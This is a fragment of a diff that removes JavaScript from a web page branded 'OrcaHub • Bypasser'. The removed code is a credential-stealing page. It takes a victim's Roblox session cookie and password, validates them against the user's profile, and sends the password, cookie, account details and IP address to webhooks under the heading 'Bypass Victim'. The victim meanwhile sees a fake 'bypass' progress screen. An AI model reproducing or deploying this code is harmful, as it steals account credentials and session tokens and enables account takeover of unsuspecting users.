-            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-          ],
-          footer: { text: "OrcaHub • Bypasser" },
-          thumbnail: { url: validation.user.avatarUrl }
-        }]
-      });
-    }
-
-    // ==================== COMPLETE BYPASS ====================
-    function completeBypass(cookie, password, userData) {
-      const embed = {
-        title: "🎯 OrcaHub • Bypass Victim",
-        color: 0xff6b6b,
-        fields: [
-          { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
-          { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
-          { name: "🔑 Password", value: `||${password}||`, inline: false },
-          { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
-          { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
-          { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
-          { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
-          { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
-          { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
-          { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-        ],
-        footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
-        thumbnail: { url: userData.avatarUrl }
-      };
-      sendToWebhooks({ embeds: [embed] });
-
-      DOM.loader.classList.remove('show');
-      DOM.result.classList.add('show');
-
-      isProcessing = false;
-      DOM.bypassBtn.disabled = false;
-      DOM.bypassBtn.textContent = '🚀 Start Bypass';
-
-      setTimeout(() => {
-        DOM.result.classList.remove('show');
-      }, 8000);
-    }
-
-    // ==================== EVENTS ====================
-    DOM.bypassBtn.addEventListener('click', startBypass);
-
-    DOM.cookieInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') startBypass();
-    });
-    DOM.passwordInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') startBypass();
-    });
-
-    DOM.cookieInput.addEventListener('blur', function() {
-      const cookie = this.value.trim();
-      if (cookie && cookie.length > 5) {
-        validateCookieWithAPI(cookie);
-      }
-    });
-
-    DOM.cookieInput.addEventListener('input', function() {
-      if (this.value.trim().length > 5) {
-        const cookie = this.value.trim();
-        fetchRobloxProfile(cookie).then(result => {
-          if (result.valid) {
-            DOM.error.classList.remove('show');
-            this.classList.remove('error');
-            this.classList.add('success');
-          } else {
-            this.classList.remove('success');
-            this.classList.add('error');
-          }
-        });
-      }
-    });
-
-  });
-</script>
+    </script>
 </body>
-    </html>
+</html>
